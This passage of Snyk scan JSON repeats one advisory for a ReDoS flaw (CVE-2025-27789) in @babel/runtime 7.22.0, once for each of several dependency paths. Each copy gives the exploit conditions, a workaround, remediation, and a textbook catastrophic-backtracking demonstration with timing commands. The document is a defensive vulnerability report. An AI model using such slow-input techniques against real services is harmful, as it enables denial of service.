        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-vendor-prefixer@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-vendor-prefixer@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-router-dom@5.2.0",
          "history@4.10.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-router-dom@5.2.0",
          "history@4.10.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-router-dom@5.2.0",
          "react-router@5.2.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-router-dom@5.2.0",
          "react-router@5.2.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@types/react-router-dom@5.1.7",
          "@types/history@5.0.0",
          "history@5.3.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@types/react-router-dom@5.1.7",
          "@types/history@5.0.0",
          "history@5.3.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
